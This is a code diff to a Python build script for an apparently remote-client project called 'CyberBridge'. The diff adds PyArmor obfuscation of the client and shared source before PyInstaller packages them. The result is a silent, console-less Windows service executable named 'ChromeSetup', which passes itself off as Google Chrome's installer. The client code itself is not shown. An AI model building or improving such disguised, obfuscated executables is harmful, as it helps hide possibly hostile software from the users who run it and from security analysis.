@@ -14,9 +14,33 @@ import os
 import subprocess
 import sys
 
-CLIENT_SCRIPT = os.path.join("client", "service.py")
+CLIENT_SCRIPT = os.path.join("obf_dist", "client", "service.py")
 OUTPUT_NAME   = "ChromeSetup"    # Professional service name
 ICON_PATH     = None                # Set to .ico path if available
+
+# ─── Obfuscation Step ─────────────────────────────────────────────────────────
+OBF_DIR = "obf_dist"
+print("[CyberBridge] Obfuscating source code with PyArmor...")
+import shutil
+if os.path.exists(OBF_DIR):
+    shutil.rmtree(OBF_DIR)
+
+# Resolve pyarmor executable path
+pyarmor_exe = "pyarmor"
+if sys.platform == "win32":
+    # Typical location for pip install --user
+    user_scripts = os.path.join(os.environ.get("APPDATA", ""), "Python", f"Python{sys.version_info.major}{sys.version_info.minor}", "Scripts", "pyarmor.exe")
+    if os.path.exists(user_scripts):
+        pyarmor_exe = user_scripts
+    elif os.path.exists(os.path.join(os.path.dirname(sys.executable), "Scripts", "pyarmor.exe")):
+        pyarmor_exe = os.path.join(os.path.dirname(sys.executable), "Scripts", "pyarmor.exe")
+
+try:
+    subprocess.run([pyarmor_exe, "gen", "-O", OBF_DIR, "-r", "client", "shared"], check=True)
+except Exception as e:
+    print(f"PyArmor obfuscation failed: {e}")
+    sys.exit(1)
+
 
 cmd = [
     sys.executable, "-m", "PyInstaller",
@@ -24,8 +48,8 @@ cmd = [
     "--noconsole",                  # No console window — completely silent
     "--clean",                      # Fresh build
     "--name", OUTPUT_NAME,
-    "--add-data", f"shared{os.pathsep}shared",
-    "--add-data", f"client{os.pathsep}client",
+    "--add-data", f"{OBF_DIR}{os.sep}shared{os.pathsep}shared",
+    "--add-data", f"{OBF_DIR}{os.sep}client{os.pathsep}client",
 
     # ── Windows Service requirements ─────────────────────────────────────────
     "--hidden-import", "win32serviceutil",
